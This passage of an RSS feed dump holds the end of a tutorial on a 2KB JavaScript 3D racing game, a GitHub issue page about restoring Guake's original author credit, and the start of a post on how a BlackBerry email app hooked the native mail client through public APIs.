          LSHA(5+R(9), 50+R(9), 29+R(9), alpha));
          
        // tree leaves
        DrawPoly(x, p1.y-R(50,99)*p1.z, p1.z*R(199,250),
          x, p1.y-R(600,800)*p1.z, 0,
          LSHA(25+R(9), 80+R(9), 9+R(29), alpha));
      }
      else
      {
        // rock
        DrawPoly(x = p1.x+p1.z*x, p1.y, p1.z*R(200,250),
          x+p1.z*(R(99,-99)), p1.y-R(200,250)*p1.z, p1.z*R(99),
          LSHA(50+R(19), 25+R(19), 209+R(9), alpha));
      }
    }
  }
}
&lt;/pre&gt;
&lt;h2&gt;Draw HUD, Update Time, Request Next Update&lt;/h2&gt;
&lt;p&gt;The game title, time, and distance are displayed with a very simple font rendering system using the DrawText function we set up earlier. Before the player clicks the mouse, it displays the title centered on the screen. I am very proud to fit the luxury of showing the game title and using bold outlined impact font. Had I been tighter on space, some of that would have been the first to go.&lt;/p&gt;
&lt;p&gt;Once the mouse has been pressed, the game starts and the HUD displays the time left and current distance. The time is also updated in this conditional block because it should only decrease after the race has started.&lt;/p&gt;
&lt;p&gt;At the very end of this massive Update function, it calls requestAnimationFrame(Update) to trigger the next update.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-7501&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/hud2.png&quot; alt=&quot;&quot; width=&quot;638&quot; height=&quot;152&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/hud2.png 638w, http://frankforce.com/wp-content/uploads/2020/03/hud2-300x71.png 300w&quot; sizes=&quot;(max-width: 638px) 100vw, 638px&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
if (mousePressed)
{
  time = Clamp(time - timeDelta, 0, maxTime); // update time
  DrawText(Math.ceil(time), 9);               // show time
  context.textAlign = 'right';                // right alignment
  DrawText(0|position.z/1e3, c.width-9);      // show distance
}
else
{
  context.textAlign = 'center';      // center alignment
  DrawText('HUE JUMPER', c.width/2); // draw title text
}

requestAnimationFrame(Update); // kick off next frame

} // end of update function
&lt;/pre&gt;
&lt;h2&gt;Final Bit of Code&lt;/h2&gt;
&lt;p&gt;The giant update function above needs to be called once to set the update loop in motion.&lt;/p&gt;
&lt;p&gt;Also, the HTML needs a closing script tag to make all that code actually run.&lt;/p&gt;
&lt;pre&gt;
Update(); // kick off update loop
&amp;lt;/script&amp;gt;
&lt;/pre&gt;
&lt;h2&gt;Minification&lt;/h2&gt;
&lt;p&gt;That’s the entire game! Here’s a look at the final result after it has been minified with color coding to show the different parts. After all that work, you can only imagine how satisfying it is seeing my entire game in a small patch of code like this. This is also before the zip which cuts the size almost in half by eliminating repetitious code.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HTML – &lt;span&gt;Red&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Functions – &lt;span&gt;Orange&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Setup – &lt;span&gt;Yellow&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Player Update – &lt;span&gt;Green&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Background Render – &lt;span&gt;Cyan&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Road Render – &lt;span&gt;Purple&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Object Render – &lt;span&gt;Pink&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;HUD Render – &lt;span&gt;Brown&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img class=&quot;alignnone wp-image-7486 size-full&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/code_breakdown4.png&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;530&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/code_breakdown4.png 600w, http://frankforce.com/wp-content/uploads/2020/03/code_breakdown4-300x265.png 300w&quot; sizes=&quot;(max-width: 600px) 100vw, 600px&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;Caveats&lt;/h2&gt;
&lt;p&gt;There are other ways to achieve 3D rendering that provide both performance and visual benefits. If I had more space available, I would have preferred to use a WebGL API like &lt;a href=&quot;https://threejs.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;three.js&lt;/a&gt; which I used for &lt;a href=&quot;https://www.newgrounds.com/portal/view/747570&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Bogus Roads, a slightly similar game I made last year.&lt;/a&gt; Also, because it is using requestAnimationFrame, there really needs to be some extra code to ensure the framerate is capped at 60 fps, which I have added to the enhanced version. I prefer using requestAnimationFrame over setInterval though because it results in smoother rendering due it to being vsynced. One major benefit to this code is it is extremely compatible and should work on any device, though it is a bit sluggish on my aging iPhone.&lt;/p&gt;
&lt;h2&gt;Wrapping It Up&lt;/h2&gt;
&lt;p&gt;Thank you for reading all of this, or at least scrolling to the bottom! I hope you learned something new. If you liked this post, &lt;a href=&quot;https://twitter.com/KilledByAPixel&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;follow me on Twitter for more stuff like this.&lt;/a&gt; &lt;a href=&quot;https://itch.io/jam/2kplus-jam/entries&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Also, there are more mind blowing games made for 2kPlus Jam, you check them all out on itch!&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/KilledByAPixel/HueJumper2k&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;The code for this game is open source on GitHub under the GPL-3.0&lt;/a&gt; so feel free to use it in your own projects. That repository also contains the 2k version which at the time of posting is only 2031 bytes! &lt;a href=&quot;https://killedbyapixel.itch.io/hue-jumper&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;You can also play the “plus” version with some bonus features like music and sound effects.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I will leave you with the first tweet I posted about this game with an early video…&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;I've been working on a tiny racing game from scratch in javascript for &lt;a href=&quot;https://twitter.com/hashtag/2kPlus?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#2kPlus&lt;/a&gt; jam! ?&lt;/p&gt;
&lt;p&gt;Mostly finished the core rendering tech now, it is super smooth and tiny. Today I move on to gameplay.&lt;a href=&quot;https://twitter.com/hashtag/javascript?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#javascript&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/creativecoding?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#creativecoding&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/gamedev?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#gamedev&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/codegolf?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#codegolf&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/tinycode?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#tinycode&lt;/a&gt; &lt;a href=&quot;https://t.co/8jNdscD295&quot;&gt;pic.twitter.com/8jNdscD295&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;— Frank Force (@KilledByAPixel) &lt;a href=&quot;https://twitter.com/KilledByAPixel/status/1227326252425601025?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2020&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And of course, I made a promotional dweet to celebrate the game’s release…&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Hue Jumper Promotional Dweet&lt;a href=&quot;https://t.co/wQ4E7ma2ke&quot;&gt;https://t.co/wQ4E7ma2ke&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;for(c.width|=i=300,x.translate(980,9);i–;x.fillText(r?`___${a%43&amp;gt;9?'_':' '}___`:'u25B2',r?-19:S(a*a*199)*49,8))x.scale(1.02,1.024),x.fillStyle=`hsl(${i+((r=(a=i+t*60|0)%9!=0)+t|0)*60} 69%40%`&lt;a href=&quot;https://twitter.com/hashtag/javascript?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#javascript&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/2kplus?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#2kplus&lt;/a&gt; &lt;a href=&quot;https://twitter.com/hashtag/tinycode?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#tinycode&lt;/a&gt; &lt;a href=&quot;https://t.co/gQ8sylp1N6&quot;&gt;pic.twitter.com/gQ8sylp1N6&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;— Frank Force (@KilledByAPixel) &lt;a href=&quot;https://twitter.com/KilledByAPixel/status/1230757426309124096?ref_src=twsrc%5Etfw&quot;&gt;February 21, 2020&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

</description>
<pubDate>Mon, 09 Mar 2020 10:30:31 +0000</pubDate>
<dc:creator>pjmlp</dc:creator>
<og:type>article</og:type>
<og:title>How I made a 3D game in only 2KB of JavaScript</og:title>
<og:url>http://frankforce.com/?p=7427</og:url>
<og:description>Months ago, when I heard that the legendary JS1k game jam would not be continuing, I talked it over with some other devs and decided to help fill the void we would host a 2k game jam on itch called…</og:description>
<og:image>http://frankforce.com/wp-content/uploads/2020/03/snapshot-38.jpg</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://frankforce.com/?p=7427</dc:identifier>
</item>
<item>
<title>Please re-add original author to docs and license</title>
<link>https://github.com/Guake/guake/issues/1703</link>
<guid isPermaLink="true" >https://github.com/Guake/guake/issues/1703</guid>
<description>&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://github.githubassets.com&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://avatars0.githubusercontent.com&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://avatars1.githubusercontent.com&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://avatars2.githubusercontent.com&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://avatars3.githubusercontent.com&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://github-cloud.s3.amazonaws.com&quot;/&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://user-images.githubusercontent.com/&quot;/&gt;&lt;link crossorigin=&quot;anonymous&quot; media=&quot;all&quot; integrity=&quot;sha512-+viYPkltBYd+WMW3PhhAgNyDWr+aqCQPK8qy7k0B3+kC0yjTdfl5y+BegvMj5iPgTTcldA+YA0npHr304cLMxw==&quot; rel=&quot;stylesheet&quot; href=&quot;https://github.githubassets.com/assets/frameworks-faf8983e496d05877e58c5b73e184080.css&quot; type=&quot;text/css&quot;/&gt;&lt;link crossorigin=&quot;anonymous&quot; media=&quot;all&quot; integrity=&quot;sha512-21eX2YaEYIYa91WFh0mXaxJ3wLQxy2ldlpRbyuCueK3MvqHGEzmXYPkMQ4XBtASauZXKlL1hPxQQU9g28R03wQ==&quot; rel=&quot;stylesheet&quot; href=&quot;https://github.githubassets.com/assets/site-db5797d9868460861af755858749976b.css&quot; type=&quot;text/css&quot;/&gt;&lt;link crossorigin=&quot;anonymous&quot; media=&quot;all&quot; integrity=&quot;sha512-+msqQ3SL85FsPBmW22/F+ovbuHRU1FxnCcQ6Tm4hVybVZLDhHMRAc382A2+2bxOORuo7Ai7mlPOLnux8DH5TVQ==&quot; rel=&quot;stylesheet&quot; href=&quot;https://github.githubassets.com/assets/github-fa6b2a43748bf3916c3c1996db6fc5fa.css&quot; type=&quot;text/css&quot;/&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;/&gt;&lt;title&gt;Please re-add original author to docs and license · Issue #1703 · Guake/guake · GitHub&lt;/title&gt;&lt;meta name=&quot;description&quot; content=&quot;Hello Guake maintainers, I'd like to start by thanking you for continuously giving love to Guake and keeping it an amazing tool for lovers of GTK. I'm the original author of the project, it started in 2007 as the guake-gnome-vte sourcefo...&quot;/&gt;&lt;link rel=&quot;search&quot; type=&quot;application/opensearchdescription+xml&quot; href=&quot;/opensearch.xml&quot; title=&quot;GitHub&quot;/&gt;&lt;link rel=&quot;fluid-icon&quot; href=&quot;https://github.com/fluidicon.png&quot; title=&quot;GitHub&quot;/&gt;&lt;meta property=&quot;fb:app_id&quot; content=&quot;1401488693436528&quot;/&gt;&lt;meta name=&quot;twitter:image:src&quot; content=&quot;https://avatars0.githubusercontent.com/u/1741188?s=400&amp;amp;v=4&quot;/&gt;&lt;meta name=&quot;twitter:site&quot; content=&quot;@github&quot;/&gt;&lt;meta name=&quot;twitter:card&quot; content=&quot;summary&quot;/&gt;&lt;meta name=&quot;twitter:title&quot; content=&quot;Please re-add original author to docs and license · Issue #1703 · Guake/guake&quot;/&gt;&lt;meta name=&quot;twitter:description&quot; content=&quot;Hello Guake maintainers, I&amp;amp;amp;#39;d like to start by thanking you for continuously giving love to Guake and keeping it an amazing tool for lovers of GTK. I&amp;amp;amp;#39;m the original author of the pro...&quot;/&gt;&lt;meta property=&quot;og:image&quot; content=&quot;https://avatars0.githubusercontent.com/u/1741188?s=400&amp;amp;v=4&quot;/&gt;&lt;meta property=&quot;og:site_name&quot; content=&quot;GitHub&quot;/&gt;&lt;meta property=&quot;og:type&quot; content=&quot;object&quot;/&gt;&lt;meta property=&quot;og:title&quot; content=&quot;Please re-add original author to docs and license · Issue #1703 · Guake/guake&quot;/&gt;&lt;meta property=&quot;og:url&quot; content=&quot;https://github.com/Guake/guake/issues/1703&quot;/&gt;&lt;meta property=&quot;og:description&quot; content=&quot;Hello Guake maintainers, I&amp;amp;#39;d like to start by thanking you for continuously giving love to Guake and keeping it an amazing tool for lovers of GTK. I&amp;amp;#39;m the original author of the project, it...&quot;/&gt;&lt;link rel=&quot;assets&quot; href=&quot;https://github.githubassets.com/&quot;/&gt;&lt;meta name=&quot;request-id&quot; content=&quot;A97B:0F27:65C6C:9E2F1:5E66E6FA&quot; data-pjax-transient=&quot;true&quot;/&gt;&lt;meta name=&quot;html-safe-nonce&quot; content=&quot;e9bbdefc7113345e2f4968881b07ad94022233b6&quot; data-pjax-transient=&quot;true&quot;/&gt;&lt;meta name=&quot;visitor-payload&quot; content=&quot;eyJyZWZlcnJlciI6Imh0dHA6Ly93d3cuZ29vZ2xlLmNvLnVrL3VybD9zYT10XHUwMDI2c291cmNlPXdlYlx1MDAyNmNkPTEiLCJyZXF1ZXN0X2lkIjoiQTk3QjowRjI3OjY1QzZDOjlFMkYxOjVFNjZFNkZBIiwidmlzaXRvcl9pZCI6IjczNTM5MTYzMjk0NzY2Nzk0MTgiLCJyZWdpb25fZWRnZSI6ImlhZCIsInJlZ2lvbl9yZW5kZXIiOiJpYWQifQ==&quot; data-pjax-transient=&quot;true&quot;/&gt;&lt;meta name=&quot;visitor-hmac&quot; content=&quot;31378e0bdee730da7e07b38bbf32ebfff12879895bd6f9331f9fea0f6cf58b08&quot; data-pjax-transient=&quot;true&quot;/&gt;&lt;meta name=&quot;hovercard-subject-tag&quot; content=&quot;issue:552405691&quot; data-pjax-transient=&quot;&quot;/&gt;&lt;meta name=&quot;github-keyboard-shortcuts&quot; content=&quot;repository,issues&quot; data-pjax-transient=&quot;true&quot;/&gt;&lt;meta name=&quot;selected-link&quot; value=&quot;repo_issues&quot; data-pjax-transient=&quot;&quot;/&gt;&lt;meta name=&quot;google-site-verification&quot; content=&quot;KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU&quot;/&gt;&lt;meta name=&quot;google-site-verification&quot; content=&quot;ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA&quot;/&gt;&lt;meta name=&quot;google-site-verification&quot; content=&quot;GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc&quot;/&gt;&lt;meta name=&quot;octolytics-host&quot; content=&quot;collector.githubapp.com&quot;/&gt;&lt;meta name=&quot;octolytics-app-id&quot; content=&quot;github&quot;/&gt;&lt;meta name=&quot;octolytics-event-url&quot; content=&quot;https://collector.githubapp.com/github-external/browser_event&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-ga_id&quot; content=&quot;&quot; class=&quot;js-octo-ga-id&quot;/&gt;&lt;meta name=&quot;analytics-location&quot; content=&quot;/&amp;lt;user-name&amp;gt;/&amp;lt;repo-name&amp;gt;/issues/show&quot; data-pjax-transient=&quot;true&quot;/&gt;&lt;meta name=&quot;google-analytics&quot; content=&quot;UA-3769691-2&quot;/&gt;&lt;meta class=&quot;js-ga-set&quot; name=&quot;dimension1&quot; content=&quot;Logged Out&quot;/&gt;&lt;meta name=&quot;hostname&quot; content=&quot;github.com&quot;/&gt;&lt;meta name=&quot;user-login&quot; content=&quot;&quot;/&gt;&lt;meta name=&quot;expected-hostname&quot; content=&quot;github.com&quot;/&gt;&lt;meta name=&quot;enabled-features&quot; content=&quot;MARKETPLACE_FEATURED_BLOG_POSTS,MARKETPLACE_INVOICED_BILLING,MARKETPLACE_SOCIAL_PROOF_CUSTOMERS,MARKETPLACE_TRENDING_SOCIAL_PROOF,MARKETPLACE_RECOMMENDATIONS,MARKETPLACE_PENDING_INSTALLATIONS,RELATED_ISSUES&quot;/&gt;&lt;meta http-equiv=&quot;x-pjax-version&quot; content=&quot;73600d5b7d1eca353716d8b4bafbfc06&quot;/&gt;&lt;link href=&quot;https://github.com/Guake/guake/commits/master.atom&quot; rel=&quot;alternate&quot; title=&quot;Recent Commits to guake:master&quot; type=&quot;application/atom+xml&quot;/&gt;&lt;meta name=&quot;go-import&quot; content=&quot;github.com/Guake/guake git https://github.com/Guake/guake.git&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-user_id&quot; content=&quot;1741188&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-user_login&quot; content=&quot;Guake&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_id&quot; content=&quot;4333252&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_nwo&quot; content=&quot;Guake/guake&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_public&quot; content=&quot;true&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_is_fork&quot; content=&quot;false&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_network_root_id&quot; content=&quot;4333252&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_network_root_nwo&quot; content=&quot;Guake/guake&quot;/&gt;&lt;meta name=&quot;octolytics-dimension-repository_explore_github_marketplace_ci_cta_shown&quot; content=&quot;false&quot;/&gt;&lt;meta name=&quot;browser-stats-url&quot; content=&quot;https://api.github.com/_private/browser/stats&quot;/&gt;&lt;meta name=&quot;browser-errors-url&quot; content=&quot;https://api.github.com/_private/browser/errors&quot;/&gt;&lt;link rel=&quot;mask-icon&quot; href=&quot;https://github.githubassets.com/pinned-octocat.svg&quot; color=&quot;#000000&quot;/&gt;&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; class=&quot;js-site-favicon&quot; href=&quot;https://github.githubassets.com/favicon.ico&quot;/&gt;&lt;meta name=&quot;theme-color&quot; content=&quot;#1e2327&quot;/&gt;&lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;2&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;4&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;2&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;4&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;6&quot;/&gt;&lt;meta itemprop=&quot;position&quot; content=&quot;8&quot;/&gt;&lt;/head&gt;&lt;body class=&quot;logged-out env-production page-responsive&quot; id=&quot;readabilityBody&quot; readability=&quot;33.348927875244&quot;&gt;



&lt;div class=&quot;application-main&quot; data-commit-hovercards-enabled=&quot;&quot;&gt;
&lt;div itemscope=&quot;&quot; itemtype=&quot;http://schema.org/SoftwareSourceCode&quot; class=&quot;&quot;&gt;

&lt;div class=&quot;container-lg clearfix new-discussion-timeline p-responsive&quot;&gt;
&lt;div class=&quot;repository-content&quot;&gt;
&lt;div class=&quot;js-check-all-container&quot; data-pjax=&quot;&quot;&gt;
&lt;div class=&quot;signup-prompt-bg rounded-1 js-signup-prompt&quot; data-prompt=&quot;signup&quot; hidden=&quot;&quot;&gt;
&lt;div class=&quot;signup-prompt p-4 text-center mb-4 rounded-1&quot; readability=&quot;31.129518072289&quot;&gt;
&lt;div class=&quot;position-relative&quot; readability=&quot;9.578313253012&quot;&gt;&lt;button type=&quot;button&quot; class=&quot;position-absolute top-0 right-0 btn-link link-gray js-signup-prompt-button&quot; data-ga-click=&quot;(Logged out) Sign up prompt, clicked Dismiss, text:dismiss&quot;&gt;Dismiss&lt;/button&gt;
&lt;h3 class=&quot;pt-2&quot;&gt;Join GitHub today&lt;/h3&gt;
&lt;p class=&quot;col-6 mx-auto&quot;&gt;GitHub is home to over 40 million developers working together to host and review code, manage projects, and build software together.&lt;/p&gt;
&lt;a class=&quot;btn btn-primary&quot; data-hydro-click=&quot;{&amp;quot;event_type&amp;quot;:&amp;quot;authentication.click&amp;quot;,&amp;quot;payload&amp;quot;:{&amp;quot;location_in_page&amp;quot;:&amp;quot;files signup prompt&amp;quot;,&amp;quot;repository_id&amp;quot;:null,&amp;quot;auth_type&amp;quot;:&amp;quot;SIGN_UP&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/Guake/guake/issues/1703&amp;quot;,&amp;quot;user_id&amp;quot;:null}}&quot; data-hydro-click-hmac=&quot;2cd354d4c068f1f5e3f51e22a4bf51e943c3150d40a7fd30a5699d9f7fd2fe37&quot; data-ga-click=&quot;(Logged out) Sign up prompt, clicked Sign up, text:sign-up&quot; href=&quot;https://github.com/join?source=prompt-issue-show&amp;amp;source_repo=Guake%2Fguake&quot;&gt;Sign up&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;You can’t perform that action at this time.&lt;/p&gt;
&lt;div class=&quot;js-stale-session-flash flash flash-warn flash-banner&quot; hidden=&quot;&quot;&gt;&lt;span class=&quot;js-stale-session-flash-signed-in&quot; hidden=&quot;&quot;&gt;You signed in with another tab or window. &lt;a href=&quot;https://github.com/Guake/guake/issues/1703&quot;&gt;Reload&lt;/a&gt; to refresh your session.&lt;/span&gt; &lt;span class=&quot;js-stale-session-flash-signed-out&quot; hidden=&quot;&quot;&gt;You signed out in another tab or window. &lt;a href=&quot;https://github.com/Guake/guake/issues/1703&quot;&gt;Reload&lt;/a&gt; to refresh your session.&lt;/span&gt;&lt;/div&gt;
&lt;details class=&quot;details-reset details-overlay details-overlay-dark lh-default text-gray-dark hx_rsm&quot; open=&quot;&quot;&gt;
&lt;/details&gt;

&lt;/body&gt;</description>
<pubDate>Mon, 09 Mar 2020 08:17:53 +0000</pubDate>
<dc:creator>selexin</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/1741188?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>Please re-add original author to docs and license · Issue #1703 · Guake/guake</og:title>
<og:url>https://github.com/Guake/guake/issues/1703</og:url>
<og:description>Hello Guake maintainers, I&amp;#39;d like to start by thanking you for continuously giving love to Guake and keeping it an amazing tool for lovers of GTK. I&amp;#39;m the original author of the project, it...</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/Guake/guake/issues/1703</dc:identifier>
</item>
<item>
<title>How I built the best-selling BlackBerry app</title>
<link>https://www.neilwithdata.com/how-i-built-bbsmart</link>
<guid isPermaLink="true" >https://www.neilwithdata.com/how-i-built-bbsmart</guid>
<description>&lt;p&gt;Many years ago, I built what I believe was the best-selling BlackBerry app of all-time, BBSmart Email Viewer. It feels strange to write that, and it's not something I'd say I'm really known for outside of the small niche community of BlackBerry app developers that used to exist. But of course this had a huge impact on my life and while there's a lot I could say on the subject, there's one aspect in particular that I've always wanted to write about - specifically, a technical trick that made the app work that very few other developers at the time could figure out.&lt;/p&gt;
&lt;p&gt;I'm now 35 and enough years have passed that it's finally time to talk about it! All my commercial interests in BBSmart are long expired, so I've put up the source code for &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer&quot;&gt;BBSmart Email Viewer on GitHub&lt;/a&gt;, along with all the other apps I built as an independent BlackBerry app developer at my company, BBSmart (many of which were also very successful - just not as much as BBSmart Email Viewer). If you do take a look, try not to judge the code too harshly - this was the work of a 23yr old developer just getting started :-)&lt;/p&gt;
&lt;h2&gt;What was BBSmart Email Viewer?&lt;/h2&gt;
&lt;p&gt;BBSmart Email Viewer was an alternative email-client for the BlackBerry. While the BlackBerry was renowned for being an email-centric device, the native email app left a lot to be desired - particularly when it came to the rendering of HTML emails: it simply couldn't handle them and would choke, spitting up a mess of HTML tag soup. BBSmart Email Viewer had a lot of cool additional functionality (reply templates, notes, task/calendar integration, etc.) but its pièce de résistance was that it could render HTML email.&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;BBSmart Email Viewer&quot; src=&quot;https://www.neilwithdata.com/images/bbsmart-email-viewer/bbsmart_comparison_01.jpg&quot; class=&quot;img-fullsize&quot;/&gt;&lt;/p&gt;
&lt;p&gt;And while BBSmart Email Viewer was an alternative email-client, it also seamlessly &lt;em&gt;in-situ&lt;/em&gt; replaced the native email client, losing none of the native functionality. This shouldn't have been possible - not only where there no APIs available to even implement most of the core functionality needed for an email client, there were also no APIs to allow developers to swap out/substitute core apps like there exist today for Android, etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How did it work?&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Hold up! Best-selling &lt;em&gt;of all-time&lt;/em&gt;?&lt;/h2&gt;
&lt;p&gt;Yes! At least, I think so. At the time the mobile space was very different from today. Android didn't exist and neither did the iPhone. There was no native &quot;app store&quot; on the BlackBerry and instead the places people went to buy apps were sites like MobiHand, Handango, and CrackBerry, or to preloaded carrier webstore bookmarks (eg. AT&amp;amp;T, T-Mobile, etc.). Because of the fragmented nature of sales, it's hard to be definitively sure.&lt;/p&gt;
&lt;p&gt;However, I have good reason to believe it was the best-selling BlackBerry app ever made.&lt;/p&gt;
&lt;p&gt;BBSmart Email Viewer released in 2007 and immediately upon release jumped to the top of the best seller-lists everywhere. The app received a ton of press, &lt;a href=&quot;http://www.berryreview.com/2007/09/11/review-bbsmart-html-email-viewer-version-23/&quot;&gt;glowing reviews&lt;/a&gt;, &lt;a href=&quot;https://crackberry.com/interview-bbsmarts-neil-sainsbury&quot;&gt;I was interviewed&lt;/a&gt;, etc. What was unique about the app however was it then stayed at the top of the best-seller lists (literally #1) on the major sites for 1 - 2 years (I didn't keep track, exactly). For over a year BBSmart Email Viewer was, day-in, day-out, the best-selling BlackBerry app. The app also generated an enormous number of sales in to enterprise, including several 10K+ license purchases, and one mass deployment with a US carrier.&lt;/p&gt;
&lt;p&gt;Because of the sales, I got to know the small industry of BlackBerry developers very well, and all the key players. Later after things wound down at BBSmart, I joined BlackBerry as part of the Developer Relations team and later still became the Director of Developer Relations at BlackBerry. Everything I learned and saw suggests BBSmart Email Viewer outsold everything.&lt;/p&gt;
&lt;h2&gt;The magic trick that made it all work - #1&lt;/h2&gt;
&lt;p&gt;So how did BBSmart Email Viewer replace the native email client seemingly on-the-fly? One interesting BlackBerry API I found when wandering around one day in the docs was that it was possible to &lt;a href=&quot;http://www.blackberry.com/developers/docs/4.1api/net/rim/blackberry/api/mail/event/ViewListener.html&quot;&gt;register a listener&lt;/a&gt; for when the user opened an email in the native email client. BBSmart Email Viewer would do this on startup &lt;a href=&quot;https://github.com/neilwithdata/BBSmart-Email-Viewer/blob/master/src/com/bbsmart/pda/blackberry/smartview/SmartView.java#L88&quot;&gt;[1]&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addViewListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When a user then opens an email, the listener would fire its &lt;code&gt;open&lt;/code&gt; event handler. Critically, from that handler, it was then possible to get a reference to the current UI stack via the call to &lt;code&gt;UiApplication.getUiApplication()&lt;/code&gt; - Once you had that reference, you could do whatever you want with any screens in the current display stack. You could pop screens from the stack, push new screens on the stack, and grab any screen in the stack and dig in and modify any of the UI components on any screen (deleting them, replacing them, etc.).&lt;/p&gt;
